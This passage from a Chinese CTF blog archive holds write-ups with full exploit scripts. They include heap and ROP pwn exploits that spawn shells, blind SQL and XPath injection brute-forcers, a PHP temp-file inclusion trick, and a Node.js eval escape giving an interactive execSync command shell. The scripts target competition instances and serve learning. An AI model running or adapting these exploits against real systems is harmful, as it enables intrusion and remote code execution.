main_arena-(next(libc.search(b&#x27;main_arena&#x27;))+0x3365f)print(hex(libc_base))delete(10)delete(8)delete(10)for i in range(7):    create(b&#x27;a&#x27;)free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]print(hex(free_hook))create(p64(free_hook-8))create(p64(0))system_addr = libc_base+libc.symbols[&#x27;system&#x27;]create(b&#x27;/bin/sh\\x00&#x27;+p64(system_addr))create(b&#x27;/bin/sh\\x00&#x27;+p64(system_addr))delete(20)# gdb.attach(r)r.interactive()\n\nblind_box流程分析这道题目的libc版本依旧存在tcache，但是题目已经给了后门函数，非预期解就是在show函数的检测只检测了libc为0x7f的情况，但是libc存在0x7e所以直接可以泄漏出libc地址，非预期解很简单，但是预期解我下去再想想。\nexpfrom pwn import *from ctypes import cdllelf = ELF(&#x27;./Blindbox&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)r = process(&#x27;./Blindbox&#x27;)context.log_level = &#x27;debug&#x27;r.recvuntil(b&#x27;Please tell me your name:&#x27;)r.sendline(b&#x27;196082&#x27;)r.recvuntil(b&#x27;The first lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))r.recvuntil(b&#x27;The second lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))r.recvuntil(b&#x27;The third lucky number?&#x27;)r.sendline(bytes(str(0x100), encoding=&#x27;utf8&#x27;))def create(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Give index for this Blindbox(1-3): &#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def drop(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which index do you want to drop?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def show(id):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which Blindbox do you want to open?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))for i in range(7):    create(1)    drop(1)create(1)create(2)drop(1)gdb.attach(r)show(1)r.recvuntil(b&#x27;Content of this Blindbox: &#x27;)main_arena = u64(r.recv(6).ljust(8, &#x27;\\x00&#x27;))-96libc_base = main_arena-next(libc.search(b&#x27;main_arena&#x27;))system_addr = libc_base+libc.symbols[&#x27;system&#x27;]objdll = cdll.LoadLibrary(&#x27;./libc-2.31.so&#x27;)objdll.srand(0)for i in range(7):    r.recvuntil(b&quot;Round &quot;+bytes(str(i), encoding=&#x27;utf8&#x27;)+b&quot; Please guess&gt;&quot;)    res = system_addr ^ objdll.rand()    r.sendline(bytes(str(res), encoding=&#x27;utf8&#x27;))r.interactive()\n\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"NCTF2019_SQLi","url":"/2021/09/19/NCTF2019-SQLi/","content":"收集信息看了一下浏览器开发者工具没什么提示什么的\n\n那就直接上dirsearch\n\n看见robots.txt直接进，里面提示有hint.txt然后查看\n内容是\n$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\&#x27;|=| |in|&lt;|&gt;|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,Then you will get the flag;\n\n这下就很明了了，他*的把贼多东西都禁用了。\n可以看到是php5.2.16。这下好办了。\n构造payload因为他已经给了我们sql语句了，那我们直接开始构造\nselect * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;闭合引号select * from users where username=&#x27;\\&#x27; and passwd=&#x27;%00&#x27;因为是php5.2.16的缘故可以用00截断，这样使引号闭合了，再就是用什么方式攻击呢？其实我也不知道，我看了一下wp知道了用regexp正则攻击\n\n所以就有了payload:\nselect * from users where username=&#x27;\\&#x27; and passwd=&#x27;||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;%00&#x27;\n\n不多废话了直接上exp了\nimport requestsimport urllibimport timeimport stringurl = &#x27;http://2beea7c9-88b6-4eaf-90af-be42303386ff.node4.buuoj.cn/index.php&#x27;payload = &#x27;||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;flag = &#x27;&#x27;string = string.ascii_lowercase+string.digits+&#x27;_&#x27;for j in range(50):    for i in string:        data = &#123;            &#x27;username&#x27;: &#x27;\\\\&#x27;,            &#x27;passwd&#x27;: payload.format(flag+i, urllib.parse.unquote(&#x27;%00&#x27;)) # 这里是防止%00被url编码了        &#125;        print(data[&#x27;passwd&#x27;])        time.sleep(0.1)        res = requests.post(url=url, data=data).text        # print(res)        if &#x27;welcome&#x27; in res:            flag += i            print(flag)            print(res)            break\n\n爆出密码不用admin帐户名直接登陆就可以拿到flag了。\n","categories":["web-buuctf"],"tags":["web| sql"]},{"title":"NPUCTF2020_ezinclude","url":"/2021/09/21/NPUCTF2020-ezinclude/","content":"\n发现思路并不清晰，就开始扫他丫的东方明珠塔。\n\n扫了仨文件出来，访问之后发现dir显示的应该是某个空目录。\n\n然后看看index的数据包，发现hash那里很长很想md5的结果，拿去py看了一下确实是32位，就尝试?pass=fa25e…上面那个。\n\n跳转到这个页面，然后我在浏览器试了很久都打不开，结果是我傻逼了，继续用burpsuite。出来让我包含文件，读取了所有文件没找到flag但是dir.php的内容其实是 print_r(scandir(‘/tmp’))。然后这里就开始打算些session条件竞争了。\n但是这个题目的预期解是利用php程序崩溃不删除临时文件然后拿到flag。\nphp://filter/string.strip_tags\n使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。\n该方法仅适用于以下php7版本，php5并不存在该崩溃：\n• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复\n\nconvert.quoted-printable-encode\n这个崩溃并不适用于include，require等函数，适用于file函数，file_get_contents函数，readfile函数\n• php7.0.0-7.0.32• php7.0.4-7.2.12• php&lt;=5.6.38的版本\n\n5.6.39-5.6.9以内的版本并不存在这个崩溃\n放出最后的exp\nimport requestspayload = b&#x27;&lt;?php phpinfo();?&gt;&#x27;file = &#123;    &#x27;file&#x27;: (&#x27;back&#x27;, payload)&#125;url = &#x27;http://bfd565e1-b0f5-4857-89f7-ebd8088c4357.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;res = requests.post(url=url, files=file)print(res.text)\n\n上方知识点师傅链接:https://www.cnblogs.com/tr1ple/p/11301743.html\n","categories":["web-buuctf"],"tags":["文件包含| php冷门知识"]},{"title":"NPUCTF2020_ezlogin","url":"/2021/10/19/NPUCTF2020-ezlogin/","content":"近期刷题感觉全是不会的，烦躁的要死，后面静下心来好好刷了。\nXpath基础语法:https://xz.aliyun.com/t/7791#toc-6\n了解玩Xpath基础语法之后就直接开始构造payload吧，先来个\n&lt;username&gt;&#x27;or 1=1 or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;3f2ea0aa5c07e1b6dbTYzNDYyNjM1Ny4&lt;/token&gt;\n\n发现弹出非法操作!然后试了很多都是，被过滤的脑壳痛去看了wp，然而事实是，弹出非法操作!就是执行结果为true。还有一点恶心的就是题目需要上传的token换得是真的快，加上又是盲注可以直接开始写脚本了。\nimport requestsimport reimport timeurl = &#x27;http://bb300bbc-590d-4a1f-8768-b659cc0efca2.node4.buuoj.cn:81/&#x27;session = requests.session()headers = &#123;    &#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/user/*[1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/user/*[2]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(name(/root/accounts/user/*[3]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[1]/username/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[1]/password/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;# payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[2]/username/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;payload = &quot;&lt;username&gt;&#x27; or substring(/root/accounts/user[2]/password/text(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;flag = &#x27;&#x27;for i in range(1, 50):    flag_length = len(flag)    for j in range(27, 128):        res = session.get(url).text        token = re.findall(            r&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*)&quot; /&gt;&#x27;, res)[0]        time.sleep(0.25)        print(payload.format(str(i), chr(j), token))        res = session.post(url, data=payload.format(            str(i), chr(j), token), headers=headers).text        if &#x27;非法操作!&#x27; in res:            flag += chr(j)            print(flag)            break    if flag_length == len(flag):        breakprint(flag)# adm1n  cf7414b5bdb2e65ee43083f4ddbc4d9f\n\n可以看见密码是md5加密的，解密一下就好，然后进入之后就是一个文件包含，但是又被过滤了，我也是在wp看到的payload\n?file=phP://filter/read=convert.bAse64-encode/resource=/flag\n\n\n","categories":["web-buuctf"],"tags":["Xpath注入"]},{"title":"NPUCTF2020_验证码","url":"/2021/11/30/NPUCTF2020-%E9%AA%8C%E8%AF%81%E7%A0%81/","content":"题目源代码const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const cookieSession = require(&#x27;cookie-session&#x27;);const fs = require(&#x27;fs&#x27;);const crypto = require(&#x27;crypto&#x27;);const keys = require(&#x27;./key.js&#x27;).keys;function md5(s) &#123;    return crypto.createHash(&#x27;md5&#x27;)        .update(s)        .digest(&#x27;hex&#x27;);&#125;function saferEval(str) &#123;    if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123;        return null;    &#125;    return eval(str);&#125; // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个const template = fs.readFileSync(&#x27;./index.html&#x27;).toString();function render(results) &#123;    return template.replace(&#x27;&#123;&#123;results&#125;&#125;&#x27;, results.join(&#x27;&lt;br/&gt;&#x27;));&#125;const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());app.use(cookieSession(&#123;    name: &#x27;PHPSESSION&#x27;, // 2020.3/WORKER2 嘿嘿，给爷爪⑧    keys&#125;));Object.freeze(Object);Object.freeze(Math);app.post(&#x27;/&#x27;, function (req, res) &#123;    let result = &#x27;&#x27;;    const results = req.session.results || [];    const &#123; e, first, second &#125; = req.body;    if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[0]) === md5(second + keys[0])) \t &#123;        if (req.body.e) &#123;            try &#123;                result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;;            &#125; catch (e) &#123;                console.log(e);                result = &#x27;Wrong Wrong Wrong!!!&#x27;;            &#125;            results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`);        &#125;    &#125; else &#123;        results.unshift(&#x27;Not verified!&#x27;);    &#125;    if (results.length &gt; 13) &#123;        results.pop();    &#125;    req.session.results = results;    res.send(render(req.session.results));&#125;);// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPIapp.get(&#x27;/source&#x27;, function (req, res) &#123;    res.set(&#x27;Content-Type&#x27;, &#x27;text/javascript;charset=utf-8&#x27;);    res.send(fs.readFileSync(&#x27;./index.js&#x27;));&#125;);app.get(&#x27;/&#x27;, function (req, res) &#123;    res.set(&#x27;Content-Type&#x27;, &#x27;text/html;charset=utf-8&#x27;);    req.session.admin = req.session.admin || 0;    res.send(render(req.session.results = req.session.results || []))&#125;);app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123;    console.log(&#x27;Start listening&#x27;)&#125;);\n\n流程分析可以看到我们post几个数据然后这里有一个比较\nif (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[0]) === md5(second + keys[0])) \n\n绕过的方式也很简单\n在js当中无论是数组还是对象和字符串相加最终都是字符串，所以我们只需要上传数组就够了哈。\nif (req.body.e) &#123;    try &#123;        result = saferEval(req.body.e) || &#x27;Wrong Wrong Wrong!!!&#x27;;    &#125; catch (e) &#123;        console.log(e);        result = &#x27;Wrong Wrong Wrong!!!&#x27;;    &#125;    results.unshift(`$&#123;req.body.e&#125;=$&#123;result&#125;`);&#125;\n\n紧接着就会执行这个\nfunction saferEval(str) &#123;    if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&amp;|^%&lt;&gt;=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, &#x27;&#x27;)) &#123;        return null;    &#125;    return eval(str);&#125;\n\n我们要匹配这个正则才能进行绕过，可以看到正则被分为了三段，第一段匹配的是Math.xxxxxxxx什么的，第二段是 ()+-*/&amp;|^%&lt;&gt;=,?: ，第三段是数字或则e1111都可以。\n利用思路就是构造出函数执行我们需要的就行\n\n后面必须用数字的我们用fromCharCode来绕过\nexpimport requestsimport jsonimport reurl = &#x27;http://51c7300e-c91d-44f8-92f8-d86efe685497.node4.buuoj.cn:81/&#x27;header = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;while True:    rce = input(&#x27;&gt;&gt;&gt;&#x27;)    if rce == &#x27;quit&#x27;:        break    content = &#x27;&#x27;    rce = &quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;&quot; + \\        rce+&quot;&#x27;).toString()&quot;    for each in rce:        content += str(ord(each))        content += &#x27;,&#x27;    content = content[:-1]    data = &#123;        &quot;first&quot;: [1],        &quot;second&quot;: &quot;1&quot;,        &quot;e&quot;: &quot;((Math)=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(&#123;&#125;))()))(Math+2)&quot;.format(content)    &#125;    res = requests.post(url=url, data=json.dumps(data), headers=header).text    res = re.findall(&#x27;&lt;div id=&quot;res&quot;&gt;\\n(.*)&#x27;, res)    print(res[0].lstrip())\n\n","categories":["web-buuctf"],"tags":["js"]},{"title":"RCalc","url":"/2021/12/26/RCalc/","content":"检查保护今年冲50篇博客看来是悬了，这玩意数论是真要了我的老命了 : (\n是真被xctf搞无语了，有时候环境创建不了就不说，居然题目给的libc版本和解题需要的版本不一致，去问Gyan大神估计都觉得我是个傻逼了。。。\n\n只打开了nx\n流程分析__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  sub_400A06();  alarm(0x78u);  sub_400FA2();  return 0LL;&#125;\n\nvoid *sub_400A06()&#123;  __int64 v0; // rbx  __int64 v1; // rbx  void *result; // rax  qword_6020F8 = malloc(0x10uLL);  if ( !qword_6020F8 )    exit(1);  qword_6020F0 = malloc(0x10uLL);  if ( !qword_6020F0 )    exit(1);  *qword_6020F8 = 0LL;  v0 = qword_6020F8;  *(v0 + 8) = malloc(0x100uLL);  *qword_6020F0 = 0LL;  v1 = qword_6020F0;  result = malloc(0x320uLL);  *(v1 + 8) = result;  return result;&#125;\n\n可以看到题目创建了几个chunk但是，注意一下chunk的创建顺序和结构就好\n__int64 sub_400FA2()&#123;  __int64 result; // rax  char v1[264]; // [rsp+0h] [rbp-110h] BYREF  __int64 v2; // [rsp+108h] [rbp-8h]  v2 = sub_400AAB();  printf(&quot;Input your name pls: &quot;);  __isoc99_scanf(&quot;%s&quot;, v1);  printf(&quot;Hello %s!\\nWelcome to RCTF 2017!!!\\n&quot;, v1);  puts(&quot;Let&#x27;s try our smart calculator&quot;);  sub_400E72();  result = sub_400B92();  if ( result != v2 )    sub_400BD4();  return result;&#125;\n\n这里存在一个栈溢出就是__isoc99_scanf(“%s”, v1);但是这里存在一个自主实现的canary保护\n__int64 sub_400AAB()&#123;  __int64 v0; // rbx  __int64 v1; // rsi  __int64 v2; // rdx  unsigned int ptr; // [rsp+Ch] [rbp-24h] BYREF  __int64 v5; // [rsp+10h] [rbp-20h]  FILE *stream; // [rsp+18h] [rbp-18h]  if ( *qword_6020F0 )  &#123;    ptr = *(*(qword_6020F0 + 8) + 8LL * *qword_6020F0 - 8);  &#125;  else  &#123;    stream = fopen(&quot;/dev/urandom&quot;, &quot;r&quot;);    fread(&amp;ptr, 1uLL, 4uLL, stream);    fclose(stream);  &#125;  srand(ptr);  v5 = rand();  v0 = v5 &lt;&lt; 32;  v5 = v0 | rand();  v1 = *(qword_6020F0 + 8);  v2 = (*qword_6020F0)++;  *(v1 + 8 * v2) = v5;  return v5;&#125;\n\n首先是这个，可以看到是将随机值放到chunk里面然后放到栈里面\n__int64 sub_400B92()&#123;  return *(*(qword_6020F0 + 8) + 8LL * (*qword_6020F0)-- - 8);&#125;\n\n通过这个拿到canary的值然后比较，自主实现的一个canary。\n我们再看在计算内部函数如果保存结果的话是保存在哪的\n__int64 __fastcall sub_400E39(__int64 a1)&#123;  __int64 v1; // rsi  __int64 v2; // rdx  __int64 result; // rax  v1 = *(qword_6020F8 + 8);  v2 = (*qword_6020F8)++;  result = a1;  *(v1 + 8 * v2) = a1;  return result;&#125;\n\n可以看到也是保存在chunk里面的，现在画个图基本就可以看出来了\n\n上面储存canary的值*(qword_6020F0 + 8)是放在这样一个chunk里面也就是最下面0x300的chunk里面的\n储存计算结果的值是放在*(qword_6020F8 + 8)这个chunk里面也就是0x100\n并且程序没有检测堆溢出，所以我们可以通过堆溢出覆盖掉下面存的canary然后就直接构造ROPgadget\n(需要注意的是不能使用puts_plt和puts_got，存在0x20会出现截断)\nexpfrom pwn import *from LibcSearcher import *elf = ELF(&#x27;./RCalc&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)# r = process(&#x27;./RCalc&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 60200)# context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]# context.log_level = &#x27;debug&#x27;pop_rdi = 0x0000000000401123printf_plt = elf.plt[&#x27;printf&#x27;]__libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]ret_addr = 0x00000000004007femain_addr = 0x401036r.recvuntil(b&#x27;Input your name pls: &#x27;)payload = b&#x27;a&#x27;*(0x110-0x8)+p64(0)+p64(0) + \\    p64(pop_rdi)+p64(__libc_start_main_got)+p64(printf_plt)+p64(main_addr)r.sendline(payload)def add(one, two):    r.recvuntil(b&#x27;Your choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;input 2 integer: &#x27;)    r.sendline(bytes(str(one), encoding=&#x27;utf8&#x27;))    r.sendline(bytes(str(two), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Save the result?&#x27;)    r.sendline(b&#x27;yes&#x27;)for i in range(int(0x100/0x8)+3):    add(0, 0)# gdb.attach(r)r.recvuntil(b&#x27;Your choice:&#x27;)r.sendline(b&#x27;5&#x27;)__libc_start_main_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;__libc_start_main&#x27;, __libc_start_main_addr)libc_base = __libc_start_main_addr-libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libc_base+libc.dump(&#x27;system&#x27;)bin_sh_addr = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)print(bin_sh_addr)print(system_addr)r.recvuntil(b&#x27;Input your name pls: &#x27;)payload = b&#x27;a&#x27;*(0x110-0x8)+p64(0)+p64(0)+p64(pop_rdi) + \\    p64(bin_sh_addr)+p64(system_addr)r.sendline(payload)for i in range(int(0x100/0x8)+3):    add(0, 0)r.recvuntil(b&#x27;Your choice:&#x27;)# gdb.attach(r)r.sendline(b&#x27;5&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["栈溢出"]},{"title":"Recho","url":"/2021/10/19/Recho/","content":"检查保护与分析\n64位只开了栈不可执行\n分析流程int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char nptr[16]; // [rsp+0h] [rbp-40h] BYREF  char buf[40]; // [rsp+10h] [rbp-30h] BYREF  int v6; // [rsp+38h] [rbp-8h]  int v7; // [rsp+3Ch] [rbp-4h]  Init(argc, argv, envp);  write(1, &quot;Welcome to Recho server!\\n&quot;, 0x19uLL);  while ( read(0, nptr, 0x10uLL) &gt; 0 )  &#123;    v7 = atoi(nptr);    if ( v7 &lt;= 15 )      v7 = 16;    v6 = read(0, buf, v7);    buf[v6] = 0;    printf(&quot;%s&quot;, buf);  &#125;  return 0;&#125;\n\nunsigned int Init()&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  return alarm(0x3Cu);&#125;\n\n可以看到程序是让我们先写入0x10个字节然后把这个指针的值转化成int类型，然后在给buf写值，所以在while循环里面的read是可以进行栈溢出。\n但是只有当return但是输入0字节不得行，但是pwntools里面的shutdown函数可以解决，但是shutdown之后就会断开连接了，所以就要把所有东西搞到栈上。\n看了wp之后发现在data段有flag这个字符串，既然没法持续连接的话就只能直接输出flag，加之flag字符串有现成的所以可以读取文件然后输出就行，open()-&gt;read()-&gt;printf()这样一个流程。\n利用过程根据上面的流程，read和printf都有直接调用就行但是open没有，所以需要构造出open函数，但是函数是在shutdown之后就结束所以想爆出libc的位置是不可能了，只有篡改got表。\n\nalarm函数的内部的第三条语句就是syscall也就是系统调用，在linux的系统调用表里面alarm也就是0x25\n\n上面还有open\n是2就可以调用到open所以可以开始构造了，众所周知64位程序的函数参数少于七个的时候是在rdi, rsi, rdx, rcx, r8, r9上，直接开始构造ROP\n\n\npayload = b&#x27;a&#x27;*0x38# 这里就是篡改got表的地址，让got表直接指向syscall    我本地gdb调出来可以看到是0x9的偏移量，但是解题需要0x5主要是因为libc版本不一样payload += p64(pop_rax_addr)+p64(0x5)+p64(pop_rdi_addr) + \\    p64(alarm_got_addr)+p64(add_rdi_al_addr)# 这一步执行opne(&#x27;flag&#x27;,0)payload += p64(pop_rdi_addr)+p64(flag_addr)+p64(pop_rsi_r15_addr) + \\    p64(0)+p64(0)+p64(pop_rax_addr)+p64(0x2)+p64(alarm_plt_addr)# 这一步执行read(fb,stdin,0x30)payload += p64(pop_rdi_addr)+p64(0x3)+p64(pop_rsi_r15_addr) + \\ # 这里open的文件描述符一般从3开始    p64(stdin_addr)+p64(0)+p64(pop_rdx_addr)+p64(0x30)+p64(read_addr)# 这里调用printf(stdin)payload += p64(pop_rdi_addr)+p64(stdin_addr)+p64(printf_addr)\n\n\n\nexpfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/773a2d87b17749b595ffb937b4d29936&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 61160)r.recvuntil(b&#x27;Welcome to Recho server!&#x27;)r.sendline(str(0x200))pop_rax_addr = 0x00000000004006fcpop_rdi_addr = 0x00000000004008a3pop_rsi_r15_addr = 0x00000000004008a1pop_rdx_addr = 0x00000000004006feadd_rdi_al_addr = 0x000000000040070dprintf_addr = elf.plt[&#x27;printf&#x27;]read_addr = elf.plt[&#x27;read&#x27;]flag_addr = elf.symbols[&#x27;flag&#x27;]alarm_plt_addr = elf.plt[&#x27;alarm&#x27;]alarm_got_addr = elf.got[&#x27;alarm&#x27;]stdin_addr = elf.symbols[&#x27;stdin&#x27;]payload = b&#x27;a&#x27;*(0x30+0x8) + p64(pop_rax_addr)+p64(0x5)+p64(pop_rdi_addr) + \\    p64(alarm_got_addr)+p64(add_rdi_al_addr)payload += p64(pop_rdi_addr)+p64(flag_addr)+p64(pop_rsi_r15_addr) + \\    p64(0)+p64(0)+p64(pop_rax_addr)+p64(0x2)+p64(alarm_plt_addr)payload += p64(pop_rdi_addr)+p64(0x3)+p64(pop_rsi_r15_addr) + \\    p64(stdin_addr)+p64(0)+p64(pop_rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(pop_rdi_addr)+p64(stdin_addr)+p64(printf_addr)r.sendline(payload)r.shutdown(&#x27;send&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["stack-overflow|ROP|GOP表篡改"]},{"title":"V&N2020 公开赛复现","url":"/2022/01/20/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B%E5%A4%8D%E7%8E%B0/","content":"总结一下:经过GFCTF的摧残打算复现一场较为简单的比赛了，虽然较为简单，但是也会有新东西学到哦。\nsimpleHeap第一题就是我前几天学得off by one漏洞。\nint sub_CBB()&#123;  int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;idx?&quot;);  v1 = sub_9EA();  if ( v1 &lt; 0 || v1 &gt; 9 || !qword_2020A0[v1] )    exit(0);  printf(&quot;content:&quot;);  sub_C39(qword_2020A0[v1], dword_202060[v1]);  return puts(&quot;Done!&quot;);&#125;\n\n漏洞出现在edit函数内，可以多出一个字节。\n题目主要存在的难点应该是让你多试一下realloc地址应该偏移多少\nexpfrom pwn import *# r = process(&#x27;./vn_pwn_simpleHeap&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 26488)elf = ELF(&#x27;./vn_pwn_simpleHeap&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;def create(size, data):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(data)def edit(id, data):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(data)def show(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def delete(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))create(0x68, b&#x27;a&#x27;*0x68)  # 0create(0x60, b&#x27;a&#x27;*0x60)  # 1create(0x60, b&#x27;a&#x27;*0x60)  # 2create(0x60, b&#x27;a&#x27;*0x60)  # 3edit(0, b&#x27;a&#x27;*0x60+p64(0x70)+p8(0xe0+1))delete(1)create(0x60, b&#x27;a&#x27;*0x60)  # 1show(2)main_arena_88 = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))info(hex(main_arena_88))malloc_hook = malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)info(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]realloc = 